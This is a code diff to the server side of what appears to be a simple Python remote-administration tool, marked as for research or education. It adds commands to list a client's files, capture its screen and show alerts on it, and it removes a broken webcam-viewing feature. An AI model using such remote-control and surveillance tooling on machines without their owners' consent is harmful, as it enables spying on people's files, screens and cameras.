@@ -6,18 +6,20 @@ ONLY USE THIS FOR REASEARCH OR EDUCATIONAL POURPOSES.
 import os
 import sys
 import socket
-import pyscreenshot
 import tkinter
+import pyscreenshot
+from tkinter import messagebox
+import cv2
 
 #host = socket.gethostname()
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 host = socket.gethostbyname(socket.gethostname())
 opensocket = True
-
-format_ = 'utf-8'
-port = 25565
 ss_num = 0
 w_num = 0
+
+# CONFIGURABLE SETTINGS
+port = 25565
 
 # Cool ascii art
 print('''
@@ -37,12 +39,12 @@ print('''
 # Connect to client
 sock.bind((host, port))
 print("Success: binded host and port (" + host + ":" + str(port) + ")")
-print("Server is starting, please wait")
+print("Server is running on " + host)
 sock.listen(1)
+print("Server is now listening for new connections")
+
 connection, address = sock.accept()
 print(str(address) + " has connected to the server")
-print("Awaiting incoming connections")
-print("Server is running on " + host)
 
 # Commands
 def add_command(command):
@@ -58,9 +60,9 @@ while opensocket:
         - list: prints all files listed in the current directory
         - listfrom: prints all files listed in a specified directory
         - screenshot: takes a screenshot and saves it to current directory
+        - disconnect: closes connection between the server and client
+        - showalert: show an alert on the client's screen (Message Box)
         - help: shows a list of commands
-        - endsession: closes sockets and client/server
-        - showcamera: show a live feed of the webcam
         ''')
 
     elif command == "list":
@@ -71,6 +73,7 @@ while opensocket:
     elif command == "listfrom":
         add_command("listfrom")
         fromdir = input(str("What directory would you like to list the files from? "))
+        connection.send(fromdir.encode())
         files = connection.recv(5000).decode()
         print(files)
 
@@ -85,46 +88,16 @@ while opensocket:
         add_command("disconnect")
         opensocket = False
         connection.close()
-        
-    elif command == "showcamera":
-        add_command("showcamera")
-        print("Showing live webcam")
-        import tkinter as tk
-        import cv2
-        from PIL import Image, ImageTk
 
-        width, height = 800, 600
-        cap = connection.recv(64).decode()
-        if not cap.isOpened():
-            raise Exception("Could not open video device")
-        cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
-        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
+    elif command == "showalert":
+        add_command("showalert")
+        title = str(input("What would you like the title of the alert to be? "))
+        connection.send(title.encode())
 
-        def ss_press():
-            global w_num
-            ret, img = cap.read()
-            cv2.imwrite('webcam_'+str(w_num)+'.png', img)
-            w_num += 1
+        message = str(input("What would you like the message of the alert to be? "))
+        connection.send(message.encode())
 
-        root = tk.Tk()
-        root.title("Webcam for " + str(address))
-        lmain = tk.Label(root)
-        lmain.pack()
-        tk.Button(root, text="Close", command=root.destroy).pack()
-        tk.Button(root, text="Screenshot", command=lambda: ss_press()).pack()
-
-        def show_frame():
-            _, frame = cap.read()
-            frame = cv2.flip(frame, 1)
-            cv2image = cv2.cvtColor(frame, cv2.COLOR_BGR2RGBA)
-            img = Image.fromarray(cv2image)
-            imgtk = ImageTk.PhotoImage(image=img)
-            lmain.imgtk = imgtk
-            lmain.configure(image=imgtk)
-            lmain.after(10, show_frame)
-
-        show_frame()
-        root.mainloop()
+        print("Alert has been sent with title of \"" + title + "\" and message of \"" + message + "\"")
 
     else:
         print("Sorry, " + command + " was not found")
